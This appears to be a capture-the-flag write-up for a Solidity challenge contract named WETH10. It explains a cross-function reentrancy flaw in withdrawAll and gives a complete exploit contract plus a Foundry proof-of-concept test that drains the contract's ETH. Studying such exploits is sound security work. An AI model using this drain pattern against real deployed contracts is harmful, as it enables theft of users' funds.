************ Personal analysis and explainer ************
The challenge's contract WETH10 presents the major flaw of not following the checks-effects-interactions
pattern. Implementing a ReentrancyGuard and assigning the nonReentrant modifier to all external funcitons
achieves the goal of protecting the contract from a reentrancy attack which takes advantage
of incomplete state updates, but it does so only for calls to it's own functions.

The exploit I present takes advantage of the withdrawAll function, which first sends the sender's
WETH10 balance in ETH to the caller, and later burns the caller's shares.
By using a contract which implements a receive() function, within this function we can transfer
the contract's WETH10 tokens to a 3rd address (in this case, bob) so that _burnAll() will
not be able to burn the tokens it is meant to burn, as balanceOf(msg.sender) evaluates to 0.
Subsequently, after withdrawAll() has terminated it's execution, the exploit contract is able to
pull back the WETH10 tokens that should've been burned and is able to repeat the process,
draining the WETH10 contract of it's ETH balance.
This flow is implemented in the exploit contract's attack() function.

************ Exploit contract ************

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WETH10.sol";

contract WETH10Exploit {
    WETH10 weth;
    address payable bob;

    constructor(WETH10 _weth10, address _bob) payable {
        weth = _weth10;
        bob = payable(_bob);
    }

    function attack() external {

        for (; address(weth).balance != 0;) {
            weth.deposit{value: 1 ether}();
            weth.withdrawAll();
            
            // Execution passes to weth10, which sends eth to address(this)
            // triggering the receive() function
            
            weth.transferFrom(bob, address(this), 1 ether);
        }
        (bool success, ) = bob.call{value: address(this).balance}("");
        require(success);
    }

    receive() external payable {
        weth.transfer(bob, 1 ether);
    }
}

************ PoC test case ************

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/WETH10.sol";
import "../src/WETH10Exploit.sol";

contract Weth10Test is Test {
    WETH10 public weth;
    address owner;
    address bob;

    function setUp() public {
        weth = new WETH10();
        bob = makeAddr("bob");

        vm.deal(address(weth), 10 ether);
        vm.deal(address(bob), 1 ether);
    }

    function testHack() public {
        assertEq(address(weth).balance, 10 ether, "weth contract should have 10 ether");


        vm.startPrank(bob);

        // hack time!
        WETH10Exploit exploit = new WETH10Exploit{value: bob.balance}(weth, bob);
        weth.approve(address(exploit), type(uint256).max);
        exploit.attack();

        vm.stopPrank();
        assertEq(address(weth).balance, 0, "empty weth contract");
        assertEq(bob.balance, 11 ether, "player should end with 11 ether");
    }
}